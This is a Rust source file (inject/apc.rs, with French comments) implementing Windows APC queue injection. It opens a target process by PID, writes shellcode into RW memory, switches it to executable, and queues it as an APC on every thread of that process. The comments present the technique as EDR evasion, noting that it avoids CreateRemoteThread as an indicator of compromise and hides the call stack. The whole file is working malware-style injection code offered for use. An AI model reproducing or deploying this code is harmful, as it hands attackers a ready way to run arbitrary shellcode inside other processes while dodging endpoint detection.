// inject/apc.rs — APC Queue Injection
//
// APC = Asynchronous Procedure Call
//
// Principe :
//   Windows permet de mettre en file d'attente (queue) des fonctions
//   à exécuter par un thread dans un état "alertable". Quand le thread
//   appelle SleepEx, WaitForSingleObjectEx ou similaire en mode alertable,
//   Windows exécute toutes les APCs en attente dans sa queue.
//
// Avantage vs CreateRemoteThread :
//   - Pas de CreateRemoteThread (IOC très forte)
//   - Le code s'exécute dans le contexte d'un thread existant légitime
//   - Le callstack EDR montre ntdll!NtTestAlert → ton shellcode
//     au lieu de kernel32!CreateRemoteThread → ton shellcode
//
// Limitation :
//   - Le thread cible doit entrer en état alertable
//   - Pas garanti d'être exécuté immédiatement
//   - Les EDR modernes surveillent aussi QueueUserAPC

/// apc_inject — injection via APC queue dans tous les threads du processus cible
///
/// Stratégie "shotgun" : on queue l'APC dans TOUS les threads du processus.
/// Le premier qui entre en état alertable exécutera le shellcode.
#[cfg(target_os = "windows")]
pub fn apc_inject(shellcode: &[u8], pid: u32) -> Result<u32, String> {
    use windows_sys::Win32::{
        Foundation::CloseHandle,
        System::{
            Diagnostics::ToolHelp::{
                CreateToolhelp32Snapshot, Thread32First, Thread32Next,
                THREADENTRY32, TH32CS_SNAPTHREAD,
            },
            Memory::{
                VirtualAllocEx, VirtualProtectEx,
                MEM_COMMIT, MEM_RESERVE,
                PAGE_EXECUTE_READ, PAGE_READWRITE,
            },
            Diagnostics::Debug::WriteProcessMemory,
            Threading::{
                OpenProcess, OpenThread,
                QueueUserAPC,
                PROCESS_ALL_ACCESS,
                THREAD_ALL_ACCESS,
            },
        },
    };

    unsafe {
        // 1. Ouvrir le processus et allouer/écrire le shellcode
        let proc_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if proc_handle == 0 {
            return Err(format!("OpenProcess failed for PID {}", pid));
        }

        let sc_size = shellcode.len();

        // Allouer en RW
        let remote_addr = VirtualAllocEx(
            proc_handle,
            std::ptr::null(),
            sc_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_addr.is_null() {
            CloseHandle(proc_handle);
            return Err("VirtualAllocEx failed".into());
        }

        // Écrire le shellcode
        let mut bytes_written = 0usize;
        WriteProcessMemory(
            proc_handle,
            remote_addr,
            shellcode.as_ptr() as _,
            sc_size,
            &mut bytes_written,
        );

        // RW → RX
        let mut old_protect = 0u32;
        VirtualProtectEx(
            proc_handle,
            remote_addr,
            sc_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        CloseHandle(proc_handle);

        // 2. Énumérer tous les threads du processus cible
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if snapshot == windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE {
            return Err("CreateToolhelp32Snapshot failed".into());
        }

        let mut entry = THREADENTRY32 {
            dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
            ..std::mem::zeroed()
        };

        let mut queued = 0u32;

        if Thread32First(snapshot, &mut entry) != 0 {
            loop {
                if entry.th32OwnerProcessID == pid {
                    // Ouvrir le thread
                    let thread_handle = OpenThread(
                        THREAD_ALL_ACCESS,
                        0,
                        entry.th32ThreadID,
                    );

                    if thread_handle != 0 {
                        // Mettre le shellcode en file d'attente APC
                        // La fonction APC sera appelée quand le thread
                        // entre en état alertable
                        let result = QueueUserAPC(
                            Some(std::mem::transmute(remote_addr)),
                            thread_handle,
                            0,
                        );

                        if result != 0 {
                            queued += 1;
                        }

                        CloseHandle(thread_handle);
                    }
                }

                if Thread32Next(snapshot, &mut entry) == 0 {
                    break;
                }
            }
        }

        CloseHandle(snapshot);

        if queued == 0 {
            return Err("No APC queued (no accessible threads)".into());
        }

        Ok(queued)
    }
}

#[cfg(not(target_os = "windows"))]
pub fn apc_inject(_shellcode: &[u8], _pid: u32) -> Result<u32, String> {
    Err("apc_inject: Windows only".into())
}
